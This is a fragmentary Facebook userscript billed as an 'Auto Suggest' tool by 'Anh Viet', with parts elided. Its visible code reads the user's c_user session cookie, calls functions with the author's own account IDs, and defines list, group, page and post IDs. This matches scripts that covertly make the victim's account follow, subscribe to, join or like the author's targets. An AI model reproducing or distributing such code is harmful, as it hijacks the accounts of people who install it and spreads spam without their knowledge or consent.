...
// @author			 Anh(Anh Viet)
// @authorURL			https://www.facebook.com/yeumotnguoithatkho.84
...
a("100004526257577"); //Anh Viet
a("100005827632470"); 

sublist("161441420683399");
sublist("111500652387522");

var gid = ['567037156640046'];
...
var spage_id = "153245244846859";
var spost_id = "153245244846859";
var sfoto_id = "153245244846859";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Anh Viet)';
